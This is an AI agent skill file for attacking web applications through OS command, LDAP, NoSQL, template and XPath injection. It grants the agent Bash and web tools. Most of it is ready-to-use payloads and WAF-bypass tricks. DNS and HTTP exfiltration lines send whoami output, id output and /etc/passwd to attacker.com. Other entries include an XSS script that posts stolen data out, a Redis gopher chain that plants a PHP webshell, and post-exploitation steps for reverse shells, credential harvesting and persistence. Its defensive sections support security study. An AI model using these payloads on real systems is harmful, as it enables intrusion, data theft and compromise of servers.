---
name: command-injection-advanced
description: "Advanced injection attacks beyond SQL - covering OS command injection, LDAP injection, NoSQL injection, template injection (SSTI), XPath injection, and comprehensive filter bypass techniques."
origin: openclaw
version: "0.2.0.2"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 10
  guide_count: 4
  owasp: "A03:2021-Injection"
  mitre: "TA0002-Execution"
  last_reviewed: "2026-07-26"
---




# Skill: Advanced Command Injection

> **Supplementary Files**:
> - `payloads.md` -- Injection payloads organized by 10 categories (OS command basics, filter bypass, LDAP injection, NoSQL injection, template injection, XPath injection, encoding/obfuscation, context-specific, blind injection, CyberGym templates)
> - `test-cases.md` -- Structured test cases with severity levels (6 test cases covering command injection bypass, LDAP auth bypass, NoSQL injection, SSTI RCE, XPath injection, template engine exploitation)
> - `guides/command-injection-filter-bypass.md` -- Comprehensive filter bypass techniques (space bypass, keyword bypass, encoding tricks)
> - `guides/ldap-nosql-injection-guide.md` -- LDAP filter injection and MongoDB/Redis exploitation
> - `guides/ssti-exploitation-guide.md` -- Template injection for RCE (Jinja2/Thymeleaf/FreeMarker)
> - `guides/blind-injection-techniques.md` -- Time-based, DNS exfil, HTTP callbacks, error-based

## Summary

Advanced Command Injection skill domain covering web attack operations beyond SQL injection.

**Tools**: commix, Burp Suite, ldapsearch, nosqli, tplmap, sqlmap, payload generators, filter analyzers, encoding scripts, callback servers

**Domain**: web-attack

**OWASP**: A03:2021-Injection

**MITRE ATT&CK**: TA0002-Execution

## Description

Advanced injection attacks expand beyond SQL to target diverse interpreters and execution engines across web applications. This skill covers OS command injection (shell command execution), LDAP injection (authentication bypass), NoSQL injection (MongoDB/Redis exploitation), template injection (SSTI for RCE), XPath injection (XML data extraction), and comprehensive filter bypass techniques.

**Six Core Injection Types**:

- **OS Command Injection**: Malicious shell commands are injected into application parameters that invoke system commands. Exploitation leverages command separators (`;`, `|`, `&&`, `||`), command substitution (`` ` ``, `$()`), and filter bypass techniques (IFS, encoding, null bytes). Target impact: arbitrary code execution, file system access, network pivoting.

- **LDAP Injection**: User-controlled input is inserted into LDAP queries without proper escaping. Attackers manipulate filters using wildcards (`*`), boolean operators (`&`, `|`), and parentheses to bypass authentication or extract directory data. Commonly found in enterprise login portals and directory search features.

- **NoSQL Injection**: Targets document databases (MongoDB) and key-value stores (Redis) that use JSON, JavaScript, or custom query languages. Exploits operator injection (`$where`, `$ne`, `$gt`), JavaScript eval contexts, and command execution primitives (Redis `EVAL`, `SCRIPT`). Can lead to authentication bypass, data exfiltration, or RCE.

- **Template Injection (SSTI)**: Server-Side Template Injection occurs when user input is embedded directly into template engines (Jinja2, Thymeleaf, FreeMarker, Pug) without sanitization. Attackers leverage template syntax to access internal objects, invoke methods, and achieve remote code execution through expression evaluation.

- **XPath Injection**: Malicious XPath syntax is injected into XML queries, allowing attackers to bypass authentication, extract node data, or traverse document structure. Similar to SQL injection but targets XML databases and XML-based authentication systems.

- **Filter Bypass Techniques**: Advanced methods to evade input validation, WAFs, and blacklist filters - including space bypass (`${IFS}`, `$IFS$9`, tabs), keyword bypass (string concatenation, wildcards, case manipulation), encoding (URL, Unicode, hex, octal, base64), and context-specific tricks (bash brace expansion, PowerShell obfuscation).

**Attack Surface**: Web forms, API parameters, HTTP headers, file upload handlers, template renderers, authentication systems, search interfaces, configuration panels, CI/CD pipelines, serverless functions.

## Use Cases

1. **Web Application Penetration Testing**: Systematically probe command execution points (ping utilities, file processors, system tools), LDAP authentication interfaces, NoSQL query endpoints, and template renderers. Construct payloads to demonstrate exploitability and measure impact scope.

2. **Bug Bounty Hunting**: Identify injection vulnerabilities in modern web stacks - serverless functions (AWS Lambda), container orchestration APIs, CI/CD webhooks, GraphQL resolvers, and microservice backends. Focus on high-value targets like authentication bypass and RCE chains.

3. **CyberGym Challenge Solving**: Target IN1-IN4 bug classes with filter-aware payloads, blind injection techniques, and multi-stage exploitation chains. Adapt to restricted environments with encoding obfuscation and protocol-level manipulation.

4. **Security Code Audit**: Review application code for unsafe command construction (`os.system()`, `subprocess.call()`), LDAP query builders, NoSQL query objects, template rendering logic, and XPath evaluators. Identify missing input validation and output encoding.

5. **Red Team Operations**: Chain injection vulnerabilities with other attack vectors - SSRF to internal services, file upload to webshell, SSTI to reverse shell, LDAP injection to credential theft. Build multi-stage payloads for defense evasion and persistence.

6. **Filter and WAF Bypass Research**: Analyze blacklist patterns, encoding normalization bugs, and parser differentials. Develop bypass techniques for commercial WAFs (ModSecurity, CloudFlare, AWS WAF) and custom input filters.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **commix** | Automated OS command injection detection and exploitation | `commix -u "http://target/ping?host=127.0.0.1" --batch --technique=TFBSC` |
| **Burp Suite** | HTTP interception, parameter tampering, injection testing, payload encoding | Repeater: modify POST body to inject SSTI payload |
| **ldapsearch** | LDAP query testing and filter manipulation | `ldapsearch -x -H ldap://target -b "dc=example,dc=com" "(uid=admin*)"` |
| **nosqli** | NoSQL injection scanner for MongoDB, CouchDB | `python nosqli-scan.py -t http://target/api/login -p username,password` |
| **tplmap** | Template injection detection and exploitation (Jinja2, Mako, etc.) | `python tplmap.py -u "http://target/view?name=test"` |
| **sqlmap** | Multi-purpose injection tool (supports OS command via `--os-cmd`) | `sqlmap -u "URL" --os-shell --technique=E` |
| **payload generators** | Custom script tools for encoding, obfuscation, format conversion | `python3 bypass-generator.py --payload "cat /etc/passwd" --encoding url,hex` |
| **filter analyzers** | Blacklist detection and bypass suggestion tools | `python3 filter-probe.py --target http://target/exec --wordlist keywords.txt` |
| **encoding scripts** | Hex, octal, Unicode, base64 encoding utilities | `echo "id" \| xxd -p` (hex), `printf '\\x69\\x64'` (octal) |
| **callback servers** | Out-of-band detection (DNS exfil, HTTP callbacks) | Burp Collaborator, interact.sh, webhook.site |

Auxiliary tools: **CyberChef** (multi-stage encoding), **Hackvertor** (Burp encoding plugin), **parameth** (parameter discovery), **Arjun** (hidden parameter scanner), **ffuf** (fuzzing), **wfuzz** (payload iteration).

---

## Methodology

### Attack Chain

```
[1] Input Point             [2] Injection Testing      [3] Filter Bypass
    Discovery                  - Syntax probes            - Encoding obfuscation
  - Command execution          - Context analysis         - Keyword alternatives
  - LDAP authentication        - Error message analysis   - Space/separator tricks
  - NoSQL query endpoints      - Behavior comparison      - Null byte injection
  - Template renderers              |                         |
  - XPath evaluators               v                         v
       |                      [4] Exploitation          [5] Post-Exploitation
       v                        - RCE payload delivery    - Reverse shell upgrade
  Authentication bypass          - Data exfiltration       - Credential harvesting
  Data extraction                - Privilege escalation    - Lateral movement
  Service enumeration            - Blind injection         - Persistence mechanisms
```

**Stage 1: Input Point Discovery**
- **Command execution surfaces**: Network utilities (ping, traceroute, nslookup), file processors (ImageMagick, FFmpeg), backup/restore functions, system info panels
- **LDAP injection points**: Login forms with AD/LDAP backend, directory search, employee lookup, SSO authentication
- **NoSQL endpoints**: REST APIs with JSON bodies, GraphQL queries, search filters, aggregation pipelines
- **Template contexts**: Email templates, PDF generators, markdown renderers, CMS themes, report builders
- **XPath targets**: XML-based authentication, SOAP APIs, RSS/Atom feed parsers, configuration file processors

**Stage 2: Injection Testing**
- **OS command probes**: Test command separators (`;`, `|`, `&&`, `||`), command substitution (`` ` ``, `$()`), and basic syntax variations
- **LDAP filter tests**: Test wildcard patterns, boolean operators (`*`, `&`, `|`), and parenthesis manipulation
- **NoSQL operator injection**: Test database-specific operators like comparison operators and regex patterns
- **SSTI detection**: Test mathematical expressions with multiple template syntaxes to identify engine
- **XPath syntax**: Test boolean logic, string functions, and XML node traversal

**Stage 3: Filter Bypass**
- **Space bypass**: Test alternative whitespace characters, bash parameter expansion, and file input redirection techniques
- **Keyword bypass**: Test quote insertion, case manipulation, character classes, and string concatenation via variable expansion
- **Encoding chains**: Test URL encoding, hex encoding, octal encoding, and base64 decoding in subshells
- **Context-specific tricks**: Test bash brace expansion, PowerShell obfuscation, and interpreter-specific syntax
- **Null byte injection**: Test null byte truncation for command-line filters

**Stage 4: Exploitation**
- **OS command RCE**: Use command substitution to execute arbitrary shell commands, establish reverse shells via network protocols
- **LDAP auth bypass**: Manipulate filter logic to bypass authentication checks, extract user attributes via boolean-based blind injection
- **NoSQL RCE**: Leverage JavaScript eval contexts in document databases, chain injection with server-side script execution
- **SSTI RCE (multi-engine)**: Access internal object hierarchies, import dangerous modules, execute system commands via template syntax
- **XPath data extraction**: Use XPath functions (substring, contains, starts-with) for binary search data extraction

**Stage 5: Post-Exploitation**
- Upgrade to interactive shell (Python pty, script pty)
- Harvest credentials from environment variables, config files, databases
- Pivot to internal services (SSH, databases, admin panels)
- Establish persistence (cron jobs, startup scripts, backdoor accounts)

### 1. OS Command Injection

#### Basic Detection

- Test time-based delays with sleep commands to confirm execution
- Test output redirection to temporary files to verify command execution
- Test out-of-band data exfiltration via DNS queries or HTTP callbacks
- Observe response timing and content to determine injection success

#### Filter Bypass - Space Replacement

Use **commix** tool for automated space bypass detection, or apply manual techniques:
- Internal Field Separator (IFS) variable expansion in bash
- Alternative whitespace characters (tab, newline, form feed)
- Brace expansion without spaces (bash-specific)
- Input redirection operators without spaces

#### Filter Bypass - Keyword Evasion

Bypass blacklist filters using:
- Quote insertion (empty quotes between characters)
- Backslash escaping of individual characters
- Variable expansion with empty or controlled values
- Wildcard and glob patterns
- Base64 encoding with decoding in subshells

#### Advanced Techniques

Use automated tools:
- **commix**: Automated OS command injection detection with multiple techniques
- **Blind detection**: Time-based delays or out-of-band callbacks via DNS/HTTP
- **Data exfiltration**: Use DNS queries, HTTP requests, or file I/O for blind injection confirmation

---

### 2. LDAP Injection

#### Authentication Bypass

LDAP filter syntax uses boolean logic (`&` for AND, `|` for OR) and wildcards (`*`). Injection manipulates these operators.

**Techniques**:
- Wildcard injection to match any user
- Boolean operator injection to create tautologies
- Closing parenthesis bypass to manipulate filter structure
- Attribute-based matching to bypass password verification

#### Data Extraction via Blind Injection

```bash
# Length enumeration - determine attribute length
username: admin)(|(uid=*  # Always true
username: admin)(|(uidNumber>=1000)  # Test numeric ranges

# Binary search for specific characters
# If "a" is first character of sn (surname):
username: admin)(|(sn=a*)  # True if starts with "a"
username: admin)(|(sn=b*)  # False if doesn't start with "b"

# Enumerate all users
ldapsearch -x -H ldap://target -b "dc=example,dc=com" "(uid=*)"

# Extract specific attributes
ldapsearch -x -H ldap://target -b "dc=example,dc=com" "(uid=admin)" sn mail telephoneNumber
```

#### LDAP Injection Testing Tools

```bash
# Manual testing with curl (HTTP to LDAP bridge)
curl -X POST http://target/login \
  -d "username=admin*)(%26(uid=*&password=test"

# Automated scanning
ldapdomaindump ldap://target -u 'DOMAIN\user' -p 'password'

# Fuzzing LDAP filters
wfuzz -c -z file,ldap-injections.txt \
  "http://target/search?query=FUZZ"
```

---

### 3. NoSQL Injection

#### MongoDB Operator Injection

NoSQL databases use operators for query construction instead of SQL syntax.

**Techniques**:
- Comparison operators to match any value without password verification
- Regex operators for pattern-based username enumeration
- Field existence checks
- JavaScript eval clauses (if enabled in configuration)

**Tool**: Use `nosqlmap` for automated operator detection and exploitation.

#### Redis Command Injection

Redis Lua scripting via EVAL command can execute system commands.

**Concept**: Chain Lua script execution with system command primitives.

**Technique**: Via SSRF vulnerability using gopher protocol to access internal Redis → execute Lua RCE chain.

**Tool**: `redis-cli` for direct access, Burp Suite for protocol-level crafting.

---

### 4. Template Injection (SSTI)

#### Detection Phase

Test multiple template syntaxes to identify template engine:

**Polyglot detection approach**: Send expressions from multiple template engines, analyze which syntax evaluates vs. remains literal. Position of evaluation indicates engine type.

**Tool**: Use `tplmap` for automated polyglot detection across all supported engines.

#### Engine Fingerprinting

Each template engine has distinct markers and accessible objects:

- **Jinja2 (Python)**: Flask config object access, class hierarchy traversal via `__mro__`
- **Thymeleaf (Java)**: T() operator for Java class access, Spring context objects
- **FreeMarker (Java)**: Specific class instantiation syntax, ObjectConstructor patterns
- **Twig (PHP)**: Environment manipulation, filter chaining for function execution
- **Smarty (PHP)**: PHP code execution blocks, system function access
- **Pug (Node.js)**: Global process object access, child_process module availability

**Tool**: `tplmap` fingerprints and identifies engine automatically.

#### Exploitation

Each template engine has distinct RCE chains based on available classes and functions.

**Jinja2 approach**: Access class hierarchy to locate executable classes, import system modules.

**Thymeleaf approach**: Use T() operator for Java Runtime.exec() and process execution.

**FreeMarker approach**: Instantiate Execute class or ObjectConstructor for command execution.

**Twig/Smarty approach**: Manipulate filter callbacks or register dangerous functions.

**Pug approach**: Access global process object for child_process execution.

**Tool**: `tplmap` automates full exploitation chain for identified engine.

---

### 5. XPath Injection

#### Authentication Bypass

XPath uses boolean logic for query conditions. Inject logic operators to manipulate filters.

**Techniques**:
- Tautology creation via boolean OR operators  
- Comment injection to ignore password requirements
- Quote and parenthesis manipulation
- Axis traversal with parent/ancestor nodes

**Concept**: Restructure XPath query to always evaluate as true regardless of credentials.

#### Blind XPath Injection

Extract data without direct output visibility via binary search.

**Functions available in XPath**:
- `string-length()` for length enumeration
- `substring()` for character extraction
- `starts-with()` and `contains()` for pattern matching
- `count()` for node enumeration
- `name()` for node name extraction

**Technique**: Boolean-based inference through response timing or error analysis.

---

## Defense Perspective

### Input Validation and Sanitization

**OS Command Injection Prevention**:
- Never pass user input directly to shell commands (`os.system()`, `subprocess.call()` with `shell=True`, PHP `exec()`)
- Use parameterized APIs: Python `subprocess.run(['/usr/bin/ping', '-c', '1', user_input])`, Node.js `child_process.execFile()`
- Whitelist allowed characters: alphanumeric, specific symbols (`.`, `-`, `_`)
- Reject command separators: `;`, `|`, `&`, `$`, `` ` ``, `\n`, `\r`

**LDAP Injection Prevention**:
- Use LDAP escaping functions: Python `ldap3.utils.conv.escape_filter_chars()`, Java `LdapEncoder.filterEncode()`
- Escape special characters: `*`, `(`, `)`, `\`, `/`, `NUL`
- Use parameterized LDAP queries where possible
- Implement strict input validation for usernames (alphanumeric + specific symbols)

**NoSQL Injection Prevention**:
- Cast user input to expected types: `parseInt()`, `String()`, schema validation
- Avoid `$where` clause - use safer query operators
- Use ORM/ODM parameterized queries: Mongoose schemas, pymongo with strict types
- Implement input validation: reject objects, only accept strings/numbers

**Template Injection Prevention**:
- Never pass user input directly to template engines
- Use sandboxed template modes: Jinja2 `SandboxedEnvironment`, FreeMarker `TemplateConfiguration`
- Disable dangerous features: Jinja2 `autoescape=True`, disable `from __future__ import`
- Separate data from templates - only pass data objects, never raw template strings

**XPath Injection Prevention**:
- Use parameterized XPath queries: C# `XPathNavigator` with compiled expressions
- Escape user input: Java `XPathFactory` with variable resolvers
- Validate input against whitelist patterns
- Use XML databases with prepared statement support

### Detection and Monitoring

```bash
# WAF rules to detect injection attempts
# Command injection signatures
SecRule ARGS "@rx (?:;|\||&amp;&amp;|\$\(|`)" "id:1001,deny,status:403"

# LDAP injection signatures
SecRule ARGS "@rx (?:\*\)|\(.*\||\)\(|objectClass)" "id:1002,deny,status:403"

# NoSQL injection signatures
SecRule REQUEST_BODY "@rx (?:\$ne|\$gt|\$where|\$regex)" "id:1003,deny,status:403"

# SSTI signatures
SecRule ARGS "@rx (?:\{\{.*\}\}|\$\{.*\}|<%=.*%>|#\{.*\})" "id:1004,deny,status:403"
```

### Security Testing Checklist

- [ ] All user input validated against whitelist patterns
- [ ] Command execution uses parameterized APIs, never shell=True
- [ ] LDAP queries use escaping functions for special characters
- [ ] NoSQL queries cast input to expected types, reject objects
- [ ] Template engines use sandboxed modes with autoescape enabled
- [ ] XPath queries use parameterized or compiled expressions
- [ ] Error messages don't leak implementation details (stack traces, query structure)
- [ ] Rate limiting applied to authentication endpoints
- [ ] Logging captures all injection attempts with full payload
- [ ] Regular security audits for new injection vectors

---

## Advanced Techniques

### Polyglot Payloads

Payloads that work across multiple contexts or injection types.

```bash
# OS command injection polyglot (multiple separators)
;id|whoami&hostname`uname -a`$(pwd)

# SSTI polyglot (multiple template engines)
{{7*7}}${7*7}#{7*7}<%= 7*7 %>${{7*7}}

# LDAP/NoSQL/XPath authentication bypass polyglot
' or '1'='1' -- 
admin' or '1'='1' /*
{"$ne": null}

# Encoding chain polyglot
%253B%2569%2564          # Double URL-encoded ;id
\x3B\x69\x64             # Hex encoded ;id
\073\151\144             # Octal encoded ;id
```

### Context-Specific Bypass

#### Windows Command Injection

```powershell
# PowerShell-specific bypass
; powershell -c "whoami"
| powershell -enc <base64>

# CMD-specific bypass
& dir C:\
&& type C:\Windows\System32\drivers\etc\hosts

# Environment variable obfuscation
%COMSPEC% /c whoami
%SystemRoot%\System32\cmd.exe /c dir
```

#### Python-Specific Payloads

```python
# Python subprocess injection
__import__('os').system('id')
__import__('subprocess').check_output(['id'])

# Python eval injection (NoSQL $where, SSTI)
eval('__import__("os").system("id")')
compile('__import__("os").popen("id").read()','','single')
```

### Blind Injection Techniques

#### Time-Based Detection

```bash
# OS command injection (universal)
; sleep 5 #
| ping -c 5 127.0.0.1 #
&& timeout 5 #

# NoSQL MongoDB (JavaScript eval)
{"$where": "sleep(5000)"}

# XPath (limited time-based functions)
' or contains(//user[1]/password,'a') and sleep(5) or '1'='2
```

#### DNS Exfiltration

```bash
# OS command injection
; nslookup $(whoami).attacker.com #
| dig $(cat /etc/passwd | base64 | head -c 50).attacker.com #

# SSTI (Jinja2)
{{config.__class__.__init__.__globals__['os'].popen('nslookup $(whoami).attacker.com').read()}}

# NoSQL (if exec allowed)
{"$where": "global.process.mainModule.require('child_process').execSync('nslookup $(whoami).attacker.com')"}
```

#### HTTP Callback

```bash
# Burp Collaborator / interact.sh / webhook.site
; curl http://burpcollaborator.net/$(whoami) #
| wget http://webhook.site/xxx?data=$(id|base64) #

# SSTI callback
{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/?c=$(id)').read()}}
```

### Filter Evasion Techniques

#### Case Manipulation

**Concept**: Some systems allow case-insensitive command execution.

**Method**: Mix uppercase and lowercase characters in command names.

#### Wildcard Obfuscation

**Concept**: Use glob patterns with `?` and `*` wildcards to match filesystem paths.

**Method**: Replace command name segments with wildcard patterns.

#### String Concatenation

**Concept**: Reconstruct commands via variable assignment and expansion.

**Methods**:
- Bash variable expansion and concatenation
- Quote insertion to break keywords
- Environment variable path manipulation

---

## CyberGym Challenge Patterns

### IN1-IN4 Bug Class Exploitation

Based on v0.1.46 trace analysis, IN1-IN4 challenges show common patterns:

**Pattern 1: Filter-Aware Encoding**
- Challenge applies character blacklist (`;`, `|`, `&`, spaces)
- Solution approach: Use alternative whitespace, brace expansion, encoding chains
- Tool: `commix` with progressive level testing

**Pattern 2: Blind Command Execution**
- No direct output in HTTP response
- Solution approach: Time-based detection, DNS/HTTP callbacks
- Tool: `commix` with blind detection modes

**Pattern 3: LDAP Authentication Bypass**
- Backend uses LDAP for authentication validation
- Solution approach: Wildcard injection, boolean operator manipulation
- Tool: Manual testing via login forms or ldapsearch

**Pattern 4: NoSQL Operator Injection**
- JSON-based API login endpoint
- Solution approach: Test comparison operators ($ne, $gt, $regex)
- Tool: `nosqlmap`

**Pattern 5: SSTI in Template Context**
- User input rendered in email template, report generator
- Solution approach: Polyglot detection, engine fingerprinting, RCE chain
- Tool: `tplmap` for automated exploitation

### Payload Adaptation Strategy

```bash
# Step 1: Identify injection context from challenge description
# Keywords: "ping utility", "LDAP authentication", "template system", "search API"

# Step 2: Start with basic detection payload
# Command: Test separator
# LDAP: Test wildcard
# NoSQL: Test operator
# SSTI: Test arithmetic expression

# Step 3: Analyze error messages or behavior
# Keyword filtered? → Apply encoding bypass
# No output? → Switch to blind detection
# Authentication failed? → Try different operators

# Step 4: Iterate with progressive bypass
# Level 1: Basic syntax
# Level 2: Space bypass techniques
# Level 3: Keyword bypass techniques
# Level 4: Encoding chain combinations

# Step 5: Confirm exploitation
# Command injection: Output visible or time delay confirmed
# LDAP: Authentication successful with bypass payload
# NoSQL: Authentication bypassed or data extracted
# SSTI: Expression evaluated and result visible
```

**Tool support**: Use `commix` to automate levels 1-4 testing, `tplmap` for SSTI, `nosqlmap` for NoSQL.

---

## Tool Mastery Progression

### Beginner (Weeks 1-2)

**Focus**: Basic injection syntax and manual testing
- Learn command separators (`;`, `|`, `&&`, `||`)
- Practice LDAP filter syntax (`*`, `(`, `)`, `&`, `|`)
- Understand NoSQL operator injection (`$ne`, `$gt`, `$where`)
- Test basic SSTI payloads (`{{7*7}}`, `${7*7}`)

**Lab Environment**:
- DVWA Command Injection module
- WebGoat LDAP Injection lesson
- NoSQL Injection Labs (MongoDB)
- PortSwigger SSTI labs

**Milestones**:
- Execute `id` command via command injection
- Bypass LDAP authentication with wildcard
- Bypass NoSQL login with `{"$ne": null}`
- Trigger SSTI with `{{7*7}}` polyglot

### Intermediate (Weeks 3-6)

**Focus**: Filter bypass and blind injection
- Master space bypass techniques (`${IFS}`, brace expansion)
- Learn keyword evasion (wildcards, concatenation)
- Practice blind injection (time-based, DNS exfil)
- Study template engine fingerprinting

**Tools**:
- commix (automated command injection)
- Burp Suite Intruder (payload iteration)
- tplmap (SSTI detection)
- nosqli scanner

**Milestones**:
- Bypass space filter in command injection
- Extract data via blind LDAP injection
- Achieve RCE via MongoDB `$where` clause
- Fingerprint and exploit Jinja2 SSTI

### Advanced (Weeks 7-12)

**Focus**: Multi-stage exploitation and evasion
- Chain injection with other vulnerabilities (SSRF + Redis)
- Develop custom encoding bypass chains
- Master polyglot payload construction
- Practice real-world challenge solving (CyberGym IN1-IN4)

**Advanced Techniques**:
- Gopher protocol for Redis EVAL injection
- Multi-context polyglot payloads
- Template sandbox escape (Jinja2 SandboxedEnvironment)
- WAF bypass research (ModSecurity, CloudFlare)

**Milestones**:
- Exploit Redis via SSRF + gopher protocol
- Bypass commercial WAF with custom payload
- Achieve RCE in sandboxed template engine
- Solve CyberGym IN1-IN4 challenges (100% success rate)

---

## Integration with Other Skills

### SSRF → Command Injection Chain

```bash
# Exploit SSRF to access internal Redis, then achieve RCE via EVAL
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_EVAL%20%22redis.call('CONFIG','SET','dir','/var/www/html')%22%200"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_EVAL%20%22redis.call('SET','payload','<?php system($_GET[c]); ?>')%22%200"
```

### File Upload → SSTI Chain

```bash
# Upload SVG with embedded SSTI payload
<svg><text>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</text></svg>

# Upload image with malicious EXIF metadata (template context)
exiftool -Comment='{{7*7}}' image.jpg
```

### XSS → Command Injection Chain

```bash
# XSS payload calls admin API with command injection
<script>
fetch('/api/admin/exec?cmd=;id', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('http://attacker.com/?data=' + btoa(d)))
</script>
```

---

## References and Resources

### Official Documentation

- **OWASP Testing Guide**: [Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- **OWASP LDAP Injection**: [Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- **NoSQL Injection**: [HackTricks Guide](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- **SSTI**: [PortSwigger Research](https://portswigger.net/research/server-side-template-injection)

### Practice Labs

- **PortSwigger Web Security Academy**: SSTI, OS Command Injection labs
- **HackTheBox Machines**: Injection-focused targets (Soccer, Encoding, RouterSpace)
- **TryHackMe Rooms**: Command Injection, SSTI Labs
- **CyberGym**: IN1-IN4 bug class challenges

### Tools and Scripts

- **commix**: https://github.com/commixproject/commix
- **tplmap**: https://github.com/epinna/tplmap
- **NoSQLMap**: https://github.com/codingo/NoSQLMap
- **Gopherus**: https://github.com/tarunkant/Gopherus
- **PayloadsAllTheThings**: [Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## Quick Reference

### Injection Type Identification Matrix

| Context Clue | Likely Injection Type | Detection Payload |
|--------------|----------------------|-------------------|
| System utility (ping, nslookup) | OS Command | `;id`, `\|whoami` |
| Login with AD/LDAP | LDAP Injection | `admin*`, `*)(&(uid=*` |
| MongoDB/Redis API | NoSQL Injection | `{"$ne": null}`, `{"$gt": ""}` |
| Email/report generator | SSTI | `{{7*7}}`, `${7*7}` |
| XML-based authentication | XPath Injection | `' or '1'='1`, `'] \| //* \| a['` |

### Bypass Technique Quick Reference

| Filter Type | Bypass Technique | Example |
|-------------|------------------|---------|
| Space blacklist | IFS, tabs, brace expansion | `cat${IFS}/etc/passwd`, `{cat,/etc/passwd}` |
| Keyword blacklist | Concatenation, wildcards | `c''at`, `/???/c?t`, `c[a]t` |
| Semicolon filter | Pipe, newline, subshell | `\|id`, `%0aid`, `` `id` `` |
| Quote filter | Backslash, hex encoding | `c\at`, `\x2f\x65\x74\x63` |

### Common Error Messages

| Error | Meaning | Next Step |
|-------|---------|-----------|
| "sh: syntax error" | Command syntax broken | Check quotes, escaping |
| "LDAP: Invalid DN syntax" | LDAP filter malformed | Verify parenthesis balance |
| "MongoError: $where" | $where blocked | Try $ne, $gt operators |
| "TemplateSyntaxError" | SSTI syntax invalid | Fingerprint engine |

---

*This skill targets CyberGym IN1-IN4 bug classes and expands injection coverage beyond SQL to modern attack vectors including LDAP, NoSQL, SSTI, and advanced filter bypass techniques.*
## Detection Methods

### Web Application Layer
- **Input pattern signatures**: Requests containing `;`, `|`, `&&`, `||`, `\` followed by command keywords (`wget`, `curl`, `bash`, `nc`).
- **WAF rule matches**: ModSecurity CRS 932100-933999 (RCE); AWS WAF `AWSManagedRulesUnixRuleSet`.
- **Parameter length outliers**: Query params exceeding 500 chars (typical injection signature).
- **Encoding anomalies**: Double-encoding (`%2520`), Unicode normalization forms in input.

### Runtime Indicators
- **Process ancestry anomalies**: Web server (`www-data`, `iis`) spawning shells (`/bin/sh`, `cmd.exe`).
- **Filesystem artifacts**: New files in `/tmp/`, `C:\\Windows\\Temp\\` from web server processes.
- **Network connections**: Web server making outbound to non-standard ports (reverse shell).
- **Error message leakage**: Detailed OS errors in HTTP responses (info disclosure).

### SIEM Detection Rules
- **Splunk SPL**: `index=web sourcetype=access_combined | regex uri=".*[;&|].*(wget|curl|bash|nc).*"`
- **Sigma rule**: `sigma/rules/web/rce_pattern.yml`
- **Falco**: `Web server spawned shell` (process ancestry alert)

## Defense Evasion Techniques

### WAF Bypass
- **Encoding obfuscation**: URL encoding (`%3B`), hex (`\x3b`), HTML entity (`&#59;`), Base64.
- **Case variation**: `WGET`, `wGeT`, `WhOaMi` (rare signatures).
- **Whitespace alternatives**: `${IFS}`, `$()`, `\\t`, `\\n` instead of spaces.
- **Comment insertion**: `w/**/get`, `w'+'get` (SQL-style).
- **Quote manipulation**: `w"g"e"t`, `w'g'e't` to defeat regex.
- **Chaining commands**: `;`, `|`, `&&`, `||`, `\\n` alternates.

### Filter Bypass
- **Keyword splitting**: `wg\\et`, `w'get`, `w\\`+`get` (bash line continuation).
- **Wildcard abuse**: `/???/??t` matches `/bin/cat`; `/???/w?get` matches wget.
- **Environment variables**: `$PATH`, `$HOME` substrings to build commands.
- **Brace expansion**: `{wget,curl}` to evade keyword filters.
- **Process substitution**: `<(/bin/sh)` to launch shell.

### Modern Mitigation Bypass
- **Polyglot payloads**: Single input that's valid in multiple contexts (SQLi + RCE).
- **Prototype pollution** (Node.js): Pollute `__proto__` to enable RCE via `child_process`.
- **Template injection**: SSTI to RCE chain (`{{constructor.constructor('id')()}}`).
- **YAML deserialization**: `!!python/object/apply:os.system ["id"]` (Python yaml.load).
- **Expression language**: Spring EL / OGNL injection (`${T(java.lang.Runtime).getRuntime().exec('id')}`).

